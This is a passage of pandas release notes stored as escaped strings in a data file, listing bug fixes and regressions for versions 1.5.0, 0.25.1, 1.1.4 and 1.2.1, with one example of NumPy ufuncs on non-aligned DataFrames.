(:issue:`45806`)\n- Bug in :meth:`Series.__setitem__` losing precision when enlarging :class:`Series` with scalar (:issue:`32346`)\n- Bug in :meth:`Series.mask` with ``inplace=True`` or setting values with a boolean mask with small integer dtypes incorrectly raising (:issue:`45750`)\n- Bug in :meth:`DataFrame.mask` with ``inplace=True`` and ``ExtensionDtype`` columns incorrectly raising (:issue:`45577`)\n- Bug in getting a column from a DataFrame with an object-dtype row index with datetime-like values: the resulting Series now preserves the exact object-dtype Index from the parent DataFrame (:issue:`42950`)\n- Bug in :meth:`DataFrame.__getattribute__` raising ``AttributeError`` if columns have ``\"string\"`` dtype (:issue:`46185`)\n- Bug in :meth:`DataFrame.compare` returning all ``NaN`` column when comparing extension array dtype and numpy dtype (:issue:`44014`)\n- Bug in :meth:`DataFrame.where` setting wrong values with ``\"boolean\"`` mask for numpy dtype (:issue:`44014`)\n- Bug in indexing on a :class:`DatetimeIndex` with a ``np.str_`` key incorrectly raising (:issue:`45580`)\n- Bug in :meth:`CategoricalIndex.get_indexer` when index contains ``NaN`` values, resulting in elements that are in target but not present in the index to be mapped to the index of the NaN element, instead of -1 (:issue:`45361`)\n- Bug in setting large integer values into :class:`Series` with ``float32`` or ``float16`` dtype incorrectly altering these values instead of coercing to ``float64`` dtype (:issue:`45844`)\n- Bug in :meth:`Series.asof` and :meth:`DataFrame.asof` incorrectly casting bool-dtype results to ``float64`` dtype (:issue:`16063`)\n- Bug in :meth:`NDFrame.xs`, :meth:`DataFrame.iterrows`, :meth:`DataFrame.loc` and :meth:`DataFrame.iloc` not always propagating metadata (:issue:`28283`)\n- Bug in :meth:`DataFrame.sum` min_count changes dtype if input contains NaNs (:issue:`46947`)\n- Bug in :class:`IntervalTree` that lead to an infinite recursion. (:issue:`46658`)\n- Bug in :class:`PeriodIndex` raising ``AttributeError`` when indexing on ``NA``, rather than putting ``NaT`` in its place. (:issue:`46673`)\n- Bug in :meth:`DataFrame.at` would allow the modification of multiple columns (:issue:`48296`)\n\nMissing\n^^^^^^^\n- Bug in :meth:`Series.fillna` and :meth:`DataFrame.fillna` with ``downcast`` keyword not being respected in some cases where there are no NA values present (:issue:`45423`)\n- Bug in :meth:`Series.fillna` and :meth:`DataFrame.fillna` with :class:`IntervalDtype` and incompatible value raising instead of casting to a common (usually object) dtype (:issue:`45796`)\n- Bug in :meth:`Series.map` not respecting ``na_action`` argument if mapper is a ``dict`` or :class:`Series` (:issue:`47527`)\n- Bug in :meth:`DataFrame.interpolate` with object-dtype column not returning a copy with ``inplace=False`` (:issue:`45791`)\n- Bug in :meth:`DataFrame.dropna` allows to set both ``how`` and ``thresh`` incompatible arguments (:issue:`46575`)\n- Bug in :meth:`DataFrame.fillna` ignored ``axis`` when :class:`DataFrame` is single block (:issue:`47713`)\n\nMultiIndex\n^^^^^^^^^^\n- Bug in :meth:`DataFrame.loc` returning empty result when slicing a :class:`MultiIndex` with a negative step size and non-null start/stop values (:issue:`46156`)\n- Bug in :meth:`DataFrame.loc` raising when slicing a :class:`MultiIndex` with a negative step size other than -1 (:issue:`46156`)\n- Bug in :meth:`DataFrame.loc` raising when slicing a :class:`MultiIndex` with a negative step size and slicing a non-int labeled index level (:issue:`46156`)\n- Bug in :meth:`Series.to_numpy` where multiindexed Series could not be converted to numpy arrays when an ``na_value`` was supplied (:issue:`45774`)\n- Bug in :class:`MultiIndex.equals` not commutative when only one side has extension array dtype (:issue:`46026`)\n- Bug in :meth:`MultiIndex.from_tuples` cannot construct Index of empty tuples (:issue:`45608`)\n\nI/O\n^^^\n- Bug in :meth:`DataFrame.to_stata` where no error is raised if the :class:`DataFrame` contains ``-np.inf`` (:issue:`45350`)\n- Bug in :func:`read_excel` results in an infinite loop with certain ``skiprows`` callables (:issue:`45585`)\n- Bug in :meth:`DataFrame.info` where a new line at the end of the output is omitted when called on an empty :class:`DataFrame` (:issue:`45494`)\n- Bug in :func:`read_csv` not recognizing line break for ``on_bad_lines=\"warn\"`` for ``engine=\"c\"`` (:issue:`41710`)\n- Bug in :meth:`DataFrame.to_csv` not respecting ``float_format`` for ``Float64`` dtype (:issue:`45991`)\n- Bug in :func:`read_csv` not respecting a specified converter to index columns in all cases (:issue:`40589`)\n- Bug in :func:`read_csv` interpreting second row as :class:`Index` names even when ``index_col=False`` (:issue:`46569`)\n- Bug in :func:`read_parquet` when ``engine=\"pyarrow\"`` which caused partial write to disk when column of unsupported datatype was passed (:issue:`44914`)\n- Bug in :func:`DataFrame.to_excel` and :class:`ExcelWriter` would raise when writing an empty DataFrame to a ``.ods`` file (:issue:`45793`)\n- Bug in :func:`read_csv` ignoring non-existing header row for ``engine=\"python\"`` (:issue:`47400`)\n- Bug in :func:`read_excel` raising uncontrolled ``IndexError`` when ``header`` references non-existing rows (:issue:`43143`)\n- Bug in :func:`read_html` where elements surrounding ``<br>`` were joined without a space between them (:issue:`29528`)\n- Bug in :func:`read_csv` when data is longer than header leading to issues with callables in ``usecols`` expecting strings (:issue:`46997`)\n- Bug in Parquet roundtrip for Interval dtype with ``datetime64[ns]`` subtype (:issue:`45881`)\n- Bug in :func:`read_excel` when reading a ``.ods`` file with newlines between xml elements (:issue:`45598`)\n- Bug in :func:`read_parquet` when ``engine=\"fastparquet\"`` where the file was not closed on error (:issue:`46555`)\n- :meth:`DataFrame.to_html` now excludes the ``border`` attribute from ``<table>`` elements when ``border`` keyword is set to ``False``.\n- Bug in :func:`read_sas` with certain types of compressed SAS7BDAT files (:issue:`35545`)\n- Bug in :func:`read_excel` not forward filling :class:`MultiIndex` when no names were given (:issue:`47487`)\n- Bug in :func:`read_sas` returned ``None`` rather than an empty DataFrame for SAS7BDAT files with zero rows (:issue:`18198`)\n- Bug in :meth:`DataFrame.to_string` using wrong missing value with extension arrays in :class:`MultiIndex` (:issue:`47986`)\n- Bug in :class:`StataWriter` where value labels were always written with default encoding (:issue:`46750`)\n- Bug in :class:`StataWriterUTF8` where some valid characters were removed from variable names (:issue:`47276`)\n- Bug in :meth:`DataFrame.to_excel` when writing an empty dataframe with :class:`MultiIndex` (:issue:`19543`)\n- Bug in :func:`read_sas` with RLE-compressed SAS7BDAT files that contain 0x40 control bytes (:issue:`31243`)\n- Bug in :func:`read_sas` that scrambled column names (:issue:`31243`)\n- Bug in :func:`read_sas` with RLE-compressed SAS7BDAT files that contain 0x00 control bytes (:issue:`47099`)\n- Bug in :func:`read_parquet` with ``use_nullable_dtypes=True`` where ``float64`` dtype was returned instead of nullable ``Float64`` dtype (:issue:`45694`)\n- Bug in :meth:`DataFrame.to_json` where ``PeriodDtype`` would not make the serialization roundtrip when read back with :meth:`read_json` (:issue:`44720`)\n- Bug in :func:`read_xml` when reading XML files with Chinese character tags and would raise ``XMLSyntaxError`` (:issue:`47902`)\n\nPeriod\n^^^^^^\n- Bug in subtraction of :class:`Period` from :class:`.PeriodArray` returning wrong results (:issue:`45999`)\n- Bug in :meth:`Period.strftime` and :meth:`PeriodIndex.strftime`, directives ``%l`` and ``%u`` were giving wrong results (:issue:`46252`)\n- Bug in inferring an incorrect ``freq`` when passing a string to :class:`Period` microseconds that are a multiple of 1000 (:issue:`46811`)\n- Bug in constructing a :class:`Period` from a :class:`Timestamp` or ``np.datetime64`` object with non-zero nanoseconds and ``freq=\"ns\"`` incorrectly truncating the nanoseconds (:issue:`46811`)\n- Bug in adding ``np.timedelta64(\"NaT\", \"ns\")`` to a :class:`Period` with a timedelta-like freq incorrectly raising ``IncompatibleFrequency`` instead of returning ``NaT`` (:issue:`47196`)\n- Bug in adding an array of integers to an array with :class:`PeriodDtype` giving incorrect results when ``dtype.freq.n > 1`` (:issue:`47209`)\n- Bug in subtracting a :class:`Period` from an array with :class:`PeriodDtype` returning incorrect results instead of raising ``OverflowError`` when the operation overflows (:issue:`47538`)\n\nPlotting\n^^^^^^^^\n- Bug in :meth:`DataFrame.plot.barh` that prevented labeling the x-axis and ``xlabel`` updating the y-axis label (:issue:`45144`)\n- Bug in :meth:`DataFrame.plot.box` that prevented labeling the x-axis (:issue:`45463`)\n- Bug in :meth:`DataFrame.boxplot` that prevented passing in ``xlabel`` and ``ylabel`` (:issue:`45463`)\n- Bug in :meth:`DataFrame.boxplot` that prevented specifying ``vert=False`` (:issue:`36918`)\n- Bug in :meth:`DataFrame.plot.scatter` that prevented specifying ``norm`` (:issue:`45809`)\n- Fix showing \"None\" as ylabel in :meth:`Series.plot` when not setting ylabel (:issue:`46129`)\n- Bug in :meth:`DataFrame.plot` that led to xticks and vertical grids being improperly placed when plotting a quarterly series (:issue:`47602`)\n- Bug in :meth:`DataFrame.plot` that prevented setting y-axis label, limits and ticks for a secondary y-axis (:issue:`47753`)\n\nGroupby/resample/rolling\n^^^^^^^^^^^^^^^^^^^^^^^^\n- Bug in :meth:`DataFrame.resample` ignoring ``closed=\"right\"`` on :class:`TimedeltaIndex` (:issue:`45414`)\n- Bug in :meth:`.DataFrameGroupBy.transform` fails when ``func=\"size\"`` and the input DataFrame has multiple columns (:issue:`27469`)\n- Bug in :meth:`.DataFrameGroupBy.size` and :meth:`.DataFrameGroupBy.transform` with ``func=\"size\"`` produced incorrect results when ``axis=1`` (:issue:`45715`)\n- Bug in :meth:`.ExponentialMovingWindow.mean` with ``axis=1`` and ``engine='numba'`` when the :class:`DataFrame` has more columns than rows (:issue:`46086`)\n- Bug when using ``engine=\"numba\"`` would return the same jitted function when modifying ``engine_kwargs`` (:issue:`46086`)\n- Bug in :meth:`.DataFrameGroupBy.transform` fails when ``axis=1`` and ``func`` is ``\"first\"`` or ``\"last\"`` (:issue:`45986`)\n- Bug in :meth:`.DataFrameGroupBy.cumsum` with ``skipna=False`` giving incorrect results (:issue:`46216`)\n- Bug in :meth:`.DataFrameGroupBy.sum`, :meth:`.SeriesGroupBy.sum`, :meth:`.DataFrameGroupBy.prod`, :meth:`.SeriesGroupBy.prod, :meth:`.DataFrameGroupBy.cumsum`, and :meth:`.SeriesGroupBy.cumsum` with integer dtypes losing precision (:issue:`37493`)\n- Bug in :meth:`.DataFrameGroupBy.cumsum` and :meth:`.SeriesGroupBy.cumsum` with ``timedelta64[ns]`` dtype failing to recognize ``NaT`` as a null value (:issue:`46216`)\n- Bug in :meth:`.DataFrameGroupBy.cumsum` and :meth:`.SeriesGroupBy.cumsum` with integer dtypes causing overflows when sum was bigger than maximum of dtype (:issue:`37493`)\n- Bug in :meth:`.DataFrameGroupBy.cummin`, :meth:`.SeriesGroupBy.cummin`, :meth:`.DataFrameGroupBy.cummax` and :meth:`.SeriesGroupBy.cummax` with nullable dtypes incorrectly altering the original data in place (:issue:`46220`)\n- Bug in :meth:`DataFrame.groupby` raising error when ``None`` is in first level of :class:`MultiIndex` (:issue:`47348`)\n- Bug in :meth:`.DataFrameGroupBy.cummax` and :meth:`.SeriesGroupBy.cummax` with ``int64`` dtype with leading value being the smallest possible int64 (:issue:`46382`)\n- Bug in :meth:`.DataFrameGroupBy.cumprod` and :meth:`.SeriesGroupBy.cumprod` ``NaN`` influences calculation in different columns with ``skipna=False`` (:issue:`48064`)\n- Bug in :meth:`.DataFrameGroupBy.max` and :meth:`.SeriesGroupBy.max` with empty groups and ``uint64`` dtype incorrectly raising ``RuntimeError`` (:issue:`46408`)\n- Bug in :meth:`.DataFrameGroupBy.apply` and :meth:`.SeriesGroupBy.apply` would fail when ``func`` was a string and args or kwargs were supplied (:issue:`46479`)\n- Bug in :meth:`SeriesGroupBy.apply` would incorrectly name its result when there was a unique group (:issue:`46369`)\n- Bug in :meth:`.Rolling.sum` and :meth:`.Rolling.mean` would give incorrect result with window of same values (:issue:`42064`, :issue:`46431`)\n- Bug in :meth:`.Rolling.var` and :meth:`.Rolling.std` would give non-zero result with window of same values (:issue:`42064`)\n- Bug in :meth:`.Rolling.skew` and :meth:`.Rolling.kurt` would give NaN with window of same values (:issue:`30993`)\n- Bug in :meth:`.Rolling.var` would segfault calculating weighted variance when window size was larger than data size (:issue:`46760`)\n- Bug in :meth:`Grouper.__repr__` where ``dropna`` was not included. Now it is (:issue:`46754`)\n- Bug in :meth:`DataFrame.rolling` gives ValueError when center=True, axis=1 and win_type is specified (:issue:`46135`)\n- Bug in :meth:`.DataFrameGroupBy.describe` and :meth:`.SeriesGroupBy.describe` produces inconsistent results for empty datasets (:issue:`41575`)\n- Bug in :meth:`DataFrame.resample` reduction methods when used with ``on`` would attempt to aggregate the provided column (:issue:`47079`)\n- Bug in :meth:`DataFrame.groupby` and :meth:`Series.groupby` would not respect ``dropna=False`` when the input DataFrame/Series had a NaN values in a :class:`MultiIndex` (:issue:`46783`)\n- Bug in :meth:`DataFrameGroupBy.resample` raises ``KeyError`` when getting the result from a key list which misses the resample key (:issue:`47362`)\n- Bug in :meth:`DataFrame.groupby` would lose index columns when the DataFrame is empty for transforms, like fillna (:issue:`47787`)\n- Bug in :meth:`DataFrame.groupby` and :meth:`Series.groupby` with ``dropna=False`` and ``sort=False`` would put any null groups at the end instead the order that they are encountered (:issue:`46584`)\n\nReshaping\n^^^^^^^^^\n- Bug in :func:`concat` between a :class:`Series` with integer dtype and another with :class:`CategoricalDtype` with integer categories and containing ``NaN`` values casting to object dtype instead of ``float64`` (:issue:`45359`)\n- Bug in :func:`get_dummies` that selected object and categorical dtypes but not string (:issue:`44965`)\n- Bug in :meth:`DataFrame.align` when aligning a :class:`MultiIndex` to a :class:`Series` with another :class:`MultiIndex` (:issue:`46001`)\n- Bug in concatenation with ``IntegerDtype``, or ``FloatingDtype`` arrays where the resulting dtype did not mirror the behavior of the non-nullable dtypes (:issue:`46379`)\n- Bug in :func:`concat` losing dtype of columns when ``join=\"outer\"`` and ``sort=True`` (:issue:`47329`)\n- Bug in :func:`concat` not sorting the column names when ``None`` is included (:issue:`47331`)\n- Bug in :func:`concat` with identical key leads to error when indexing :class:`MultiIndex` (:issue:`46519`)\n- Bug in :func:`pivot_table` raising ``TypeError`` when ``dropna=True`` and aggregation column has extension array dtype (:issue:`47477`)\n- Bug in :func:`merge` raising error for ``how=\"cross\"`` when using ``FIPS`` mode in ssl library (:issue:`48024`)\n- Bug in :meth:`DataFrame.join` with a list when using suffixes to join DataFrames with duplicate column names (:issue:`46396`)\n- Bug in :meth:`DataFrame.pivot_table` with ``sort=False`` results in sorted index (:issue:`17041`)\n- Bug in :meth:`concat` when ``axis=1`` and ``sort=False`` where the resulting Index was a :class:`Int64Index` instead of a :class:`RangeIndex` (:issue:`46675`)\n- Bug in :meth:`wide_to_long` raises when ``stubnames`` is missing in columns and ``i`` contains string dtype column (:issue:`46044`)\n- Bug in :meth:`DataFrame.join` with categorical index results in unexpected reordering (:issue:`47812`)\n\nSparse\n^^^^^^\n- Bug in :meth:`Series.where` and :meth:`DataFrame.where` with ``SparseDtype`` failing to retain the array's ``fill_value`` (:issue:`45691`)\n- Bug in :meth:`SparseArray.unique` fails to keep original elements order (:issue:`47809`)\n\nExtensionArray\n^^^^^^^^^^^^^^\n- Bug in :meth:`IntegerArray.searchsorted` and :meth:`FloatingArray.searchsorted` returning inconsistent results when acting on ``np.nan`` (:issue:`45255`)\n\nStyler\n^^^^^^\n- Bug when attempting to apply styling functions to an empty DataFrame subset (:issue:`45313`)\n- Bug in :class:`CSSToExcelConverter` leading to ``TypeError`` when border color provided without border style for ``xlsxwriter`` engine (:issue:`42276`)\n- Bug in :meth:`Styler.set_sticky` leading to white text on white background in dark mode (:issue:`46984`)\n- Bug in :meth:`Styler.to_latex` causing ``UnboundLocalError`` when ``clines=\"all;data\"`` and the ``DataFrame`` has no rows. (:issue:`47203`)\n- Bug in :meth:`Styler.to_excel` when using ``vertical-align: middle;`` with ``xlsxwriter`` engine (:issue:`30107`)\n- Bug when applying styles to a DataFrame with boolean column labels (:issue:`47838`)\n\nMetadata\n^^^^^^^^\n- Fixed metadata propagation in :meth:`DataFrame.melt` (:issue:`28283`)\n- Fixed metadata propagation in :meth:`DataFrame.explode` (:issue:`28283`)\n\nOther\n^^^^^\n\n.. ***DO NOT USE THIS SECTION***\n\n- Bug in :func:`.assert_index_equal` with ``names=True`` and ``check_order=False`` not checking names (:issue:`47328`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_150.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.4.4..v1.5.0\n", "0.2": ".. _whatsnew_0251:\n\nWhat's new in 0.25.1 (August 21, 2019)\n--------------------------------------\n\nThese are the changes in pandas 0.25.1. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\nIO and LZMA\n~~~~~~~~~~~\n\nSome users may unknowingly have an incomplete Python installation lacking the ``lzma`` module from the standard library. In this case, ``import pandas`` failed due to an ``ImportError`` (:issue:`27575`).\npandas will now warn, rather than raising an ``ImportError`` if the ``lzma`` module is not present. Any subsequent attempt to use ``lzma`` methods will raise a ``RuntimeError``.\nA possible fix for the lack of the ``lzma`` module is to ensure you have the necessary libraries and then re-install Python.\nFor example, on MacOS installing Python with ``pyenv`` may lead to an incomplete Python installation due to unmet system dependencies at compilation time (like ``xz``). Compilation will succeed, but Python might fail at run time. The issue can be solved by installing the necessary dependencies and then re-installing Python.\n\n.. _whatsnew_0251.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\nCategorical\n^^^^^^^^^^^\n\n- Bug in :meth:`Categorical.fillna` that would replace all values, not just those that are ``NaN`` (:issue:`26215`)\n\nDatetimelike\n^^^^^^^^^^^^\n\n- Bug in :func:`to_datetime` where passing a timezone-naive :class:`DatetimeArray` or :class:`DatetimeIndex` and ``utc=True`` would incorrectly return a timezone-naive result (:issue:`27733`)\n- Bug in :meth:`Period.to_timestamp` where a :class:`Period` outside the :class:`Timestamp` implementation bounds (roughly 1677-09-21 to 2262-04-11) would return an incorrect :class:`Timestamp` instead of raising ``OutOfBoundsDatetime`` (:issue:`19643`)\n- Bug in iterating over :class:`DatetimeIndex` when the underlying data is read-only (:issue:`28055`)\n\nTimezones\n^^^^^^^^^\n\n- Bug in :class:`Index` where a numpy object array with a timezone aware :class:`Timestamp` and ``np.nan`` would not return a :class:`DatetimeIndex` (:issue:`27011`)\n\nNumeric\n^^^^^^^\n\n- Bug in :meth:`Series.interpolate` when using a timezone aware :class:`DatetimeIndex` (:issue:`27548`)\n- Bug when printing negative floating point complex numbers would raise an ``IndexError`` (:issue:`27484`)\n- Bug where :class:`DataFrame` arithmetic operators such as :meth:`DataFrame.mul` with a :class:`Series` with axis=1 would raise an ``AttributeError`` on :class:`DataFrame` larger than the minimum threshold to invoke numexpr (:issue:`27636`)\n- Bug in :class:`DataFrame` arithmetic where missing values in results were incorrectly masked with ``NaN`` instead of ``Inf`` (:issue:`27464`)\n\nConversion\n^^^^^^^^^^\n\n- Improved the warnings for the deprecated methods :meth:`Series.real` and :meth:`Series.imag` (:issue:`27610`)\n\nInterval\n^^^^^^^^\n\n- Bug in :class:`IntervalIndex` where ``dir(obj)`` would raise ``ValueError`` (:issue:`27571`)\n\nIndexing\n^^^^^^^^\n\n- Bug in partial-string indexing returning a NumPy array rather than a ``Series`` when indexing with a scalar like ``.loc['2015']`` (:issue:`27516`)\n- Break reference cycle involving :class:`Index` and other index classes to allow garbage collection of index objects without running the GC. (:issue:`27585`, :issue:`27840`)\n- Fix regression in assigning values to a single column of a DataFrame with a ``MultiIndex`` columns (:issue:`27841`).\n- Fix regression in ``.ix`` fallback with an ``IntervalIndex`` (:issue:`27865`).\n\nMissing\n^^^^^^^\n\n- Bug in :func:`pandas.isnull` or :func:`pandas.isna` when the input is a type e.g. ``type(pandas.Series())`` (:issue:`27482`)\n\nIO\n^^\n\n- Avoid calling ``S3File.s3`` when reading parquet, as this was removed in s3fs version 0.3.0 (:issue:`27756`)\n- Better error message when a negative header is passed in :func:`pandas.read_csv` (:issue:`27779`)\n- Follow the ``min_rows`` display option (introduced in v0.25.0) correctly in the HTML repr in the notebook (:issue:`27991`).\n\nPlotting\n^^^^^^^^\n\n- Added a ``pandas_plotting_backends`` entrypoint group for registering plot backends. See :ref:`extending.plotting-backends` for more (:issue:`26747`).\n- Fixed the re-instatement of Matplotlib datetime converters after calling\n  :meth:`pandas.plotting.deregister_matplotlib_converters` (:issue:`27481`).\n- Fix compatibility issue with matplotlib when passing a pandas ``Index`` to a plot call (:issue:`27775`).\n\nGroupBy/resample/rolling\n^^^^^^^^^^^^^^^^^^^^^^^^\n\n- Fixed regression in :meth:`pands.core.groupby.DataFrameGroupBy.quantile` raising when multiple quantiles are given (:issue:`27526`)\n- Bug in :meth:`.DataFrameGroupBy.transform` where applying a timezone conversion lambda function would drop timezone information (:issue:`27496`)\n- Bug in :meth:`.GroupBy.nth` where ``observed=False`` was being ignored for Categorical groupers (:issue:`26385`)\n- Bug in windowing over read-only arrays (:issue:`27766`)\n- Fixed segfault in ``.DataFrameGroupBy.quantile`` when an invalid quantile was passed (:issue:`27470`)\n\nReshaping\n^^^^^^^^^\n\n- A ``KeyError`` is now raised if ``.unstack()`` is called on a :class:`Series` or :class:`DataFrame` with a flat :class:`Index` passing a name which is not the correct one (:issue:`18303`)\n- Bug :meth:`merge_asof` could not merge :class:`Timedelta` objects when passing ``tolerance`` kwarg (:issue:`27642`)\n- Bug in :meth:`DataFrame.crosstab` when ``margins`` set to ``True`` and ``normalize`` is not ``False``, an error is raised. (:issue:`27500`)\n- :meth:`DataFrame.join` now suppresses the ``FutureWarning`` when the sort parameter is specified (:issue:`21952`)\n- Bug in :meth:`DataFrame.join` raising with readonly arrays (:issue:`27943`)\n\nSparse\n^^^^^^\n\n- Bug in reductions for :class:`Series` with Sparse dtypes (:issue:`27080`)\n\nOther\n^^^^^\n\n- Bug in :meth:`Series.replace` and :meth:`DataFrame.replace` when replacing timezone-aware timestamps using a dict-like replacer (:issue:`27720`)\n- Bug in :meth:`Series.rename` when using a custom type indexer. Now any value that isn't callable or dict-like is treated as a scalar. (:issue:`27814`)\n\n.. _whatsnew_0.251.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.25.0..v0.25.1\n", "1.1.4": ".. _whatsnew_114:\n\nWhat's new in 1.1.4 (October 30, 2020)\n--------------------------------------\n\nThese are the changes in pandas 1.1.4. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_114.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed regression in :func:`read_csv` raising a ``ValueError`` when ``names`` was of type ``dict_keys`` (:issue:`36928`)\n- Fixed regression in :func:`read_csv` with more than 1M rows and specifying a ``index_col`` argument (:issue:`37094`)\n- Fixed regression where attempting to mutate a :class:`DateOffset` object would no longer raise an ``AttributeError`` (:issue:`36940`)\n- Fixed regression where :meth:`DataFrame.agg` would fail with :exc:`TypeError` when passed positional arguments to be passed on to the aggregation function (:issue:`36948`).\n- Fixed regression in :class:`RollingGroupby` with ``sort=False`` not being respected (:issue:`36889`)\n- Fixed regression in :meth:`Series.astype` converting ``None`` to ``\"nan\"`` when casting to string (:issue:`36904`)\n- Fixed regression in :meth:`Series.rank` method failing for read-only data (:issue:`37290`)\n- Fixed regression in :class:`RollingGroupby` causing a segmentation fault with Index of dtype object (:issue:`36727`)\n- Fixed regression in :meth:`DataFrame.resample(...).apply(...)` raised ``AttributeError`` when input was a :class:`DataFrame` and only a :class:`Series` was evaluated (:issue:`36951`)\n- Fixed regression in ``DataFrame.groupby(..).std()`` with nullable integer dtype (:issue:`37415`)\n- Fixed regression in :class:`PeriodDtype` comparing both equal and unequal to its string representation (:issue:`37265`)\n- Fixed regression where slicing :class:`DatetimeIndex` raised :exc:`AssertionError` on irregular time series with ``pd.NaT`` or on unsorted indices (:issue:`36953` and :issue:`35509`)\n- Fixed regression in certain offsets (:meth:`pd.offsets.Day() <pandas.tseries.offsets.Day>` and below) no longer being hashable (:issue:`37267`)\n- Fixed regression in :class:`StataReader` which required ``chunksize`` to be manually set when using an iterator to read a dataset (:issue:`37280`)\n- Fixed regression in setitem with :meth:`DataFrame.iloc` which raised error when trying to set a value while filtering with a boolean list (:issue:`36741`)\n- Fixed regression in setitem with a Series getting aligned before setting the values (:issue:`37427`)\n- Fixed regression in :attr:`MultiIndex.is_monotonic_increasing` returning wrong results with ``NaN`` in at least one of the levels (:issue:`37220`)\n- Fixed regression in inplace arithmetic operation (`+=`) on a Series not updating the parent DataFrame/Series (:issue:`36373`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_114.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Bug causing ``groupby(...).sum()`` and similar to not preserve metadata (:issue:`29442`)\n- Bug in :meth:`Series.isin` and :meth:`DataFrame.isin` raising a ``ValueError`` when the target was read-only (:issue:`37174`)\n- Bug in :meth:`.DataFrameGroupBy.fillna` and :meth:`.SeriesGroupBy.fillna` that introduced a performance regression after 1.0.5 (:issue:`36757`)\n- Bug in :meth:`DataFrame.info` was raising a ``KeyError`` when the DataFrame has integer column names (:issue:`37245`)\n- Bug in :meth:`DataFrameGroupby.apply` would drop a :class:`CategoricalIndex` when grouped on (:issue:`35792`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_114.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.1.3..v1.1.4\n", "1.2.1": ".. _whatsnew_121:\n\nWhat's new in 1.2.1 (January 20, 2021)\n--------------------------------------\n\nThese are the changes in pandas 1.2.1. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_121.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed regression in :meth:`~DataFrame.to_csv` that created corrupted zip files when there were more rows than ``chunksize`` (:issue:`38714`)\n- Fixed regression in :meth:`~DataFrame.to_csv` opening ``codecs.StreamReaderWriter`` in binary mode instead of in text mode (:issue:`39247`)\n- Fixed regression in :meth:`read_csv` and other read functions were the encoding error policy (``errors``) did not default to ``\"replace\"`` when no encoding was specified (:issue:`38989`)\n- Fixed regression in :func:`read_excel` with non-rawbyte file handles (:issue:`38788`)\n- Fixed regression in :meth:`DataFrame.to_stata` not removing the created file when an error occurred (:issue:`39202`)\n- Fixed regression in ``DataFrame.__setitem__`` raising ``ValueError`` when expanding :class:`DataFrame` and new column is from type ``\"0 - name\"`` (:issue:`39010`)\n- Fixed regression in setting with :meth:`DataFrame.loc`  raising ``ValueError`` when :class:`DataFrame` has unsorted :class:`MultiIndex` columns and indexer is a scalar (:issue:`38601`)\n- Fixed regression in setting with :meth:`DataFrame.loc` raising ``KeyError`` with :class:`MultiIndex` and list-like columns indexer enlarging :class:`DataFrame` (:issue:`39147`)\n- Fixed regression in :meth:`~DataFrame.groupby()` with :class:`Categorical` grouping column not showing unused categories for ``grouped.indices`` (:issue:`38642`)\n- Fixed regression in :meth:`.DataFrameGroupBy.sem` and :meth:`.SeriesGroupBy.sem` where the presence of non-numeric columns would cause an error instead of being dropped (:issue:`38774`)\n- Fixed regression in :meth:`.DataFrameGroupBy.diff` raising for ``int8`` and ``int16`` columns (:issue:`39050`)\n- Fixed regression in :meth:`DataFrame.groupby` when aggregating an ``ExtensionDType`` that could fail for non-numeric values (:issue:`38980`)\n- Fixed regression in :meth:`.Rolling.skew` and :meth:`.Rolling.kurt` modifying the object inplace (:issue:`38908`)\n- Fixed regression in :meth:`DataFrame.any` and :meth:`DataFrame.all` not returning a result for tz-aware ``datetime64`` columns (:issue:`38723`)\n- Fixed regression in :meth:`DataFrame.apply` with ``axis=1`` using str accessor in apply function (:issue:`38979`)\n- Fixed regression in :meth:`DataFrame.replace` raising ``ValueError`` when :class:`DataFrame` has dtype ``bytes`` (:issue:`38900`)\n- Fixed regression in :meth:`Series.fillna` that raised ``RecursionError`` with ``datetime64[ns, UTC]`` dtype (:issue:`38851`)\n- Fixed regression in comparisons between ``NaT`` and ``datetime.date`` objects incorrectly returning ``True`` (:issue:`39151`)\n- Fixed regression in calling NumPy :func:`~numpy.ufunc.accumulate` ufuncs on DataFrames, e.g. ``np.maximum.accumulate(df)`` (:issue:`39259`)\n- Fixed regression in repr of float-like strings of an ``object`` dtype having trailing 0's truncated after the decimal (:issue:`38708`)\n- Fixed regression that raised ``AttributeError`` with PyArrow versions [0.16.0, 1.0.0) (:issue:`38801`)\n- Fixed regression in :func:`pandas.testing.assert_frame_equal` raising ``TypeError`` with ``check_like=True`` when :class:`Index` or columns have mixed dtype (:issue:`39168`)\n\nWe have reverted a commit that resulted in several plotting related regressions in pandas 1.2.0 (:issue:`38969`, :issue:`38736`, :issue:`38865`, :issue:`38947` and :issue:`39126`).\nAs a result, bugs reported as fixed in pandas 1.2.0 related to inconsistent tick labeling in bar plots are again present (:issue:`26186` and :issue:`11465`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_121.ufunc_deprecation:\n\nCalling NumPy ufuncs on non-aligned DataFrames\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nBefore pandas 1.2.0, calling a NumPy ufunc on non-aligned DataFrames (or\nDataFrame / Series combination) would ignore the indices, only match\nthe inputs by shape, and use the index/columns of the first DataFrame for\nthe result:\n\n.. code-block:: ipython\n\n    In [1]: df1 = pd.DataFrame({\"a\": [1, 2], \"b\": [3, 4]}, index=[0, 1])\n    In [2]: df2 = pd.DataFrame({\"a\": [1, 2], \"b\": [3, 4]}, index=[1, 2])\n    In [3]: df1\n    Out[3]:\n       a  b\n    0  1  3\n    1  2  4\n    In [4]: df2\n    Out[4]:\n       a  b\n    1  1  3\n    2  2  4\n\n    In [5]: np.add(df1, df2)\n    Out[5]:\n       a  b\n    0  2  6\n    1  4  8\n\nThis contrasts with how other pandas operations work, which first align\nthe inputs:\n\n.. code-block:: ipython\n\n    In 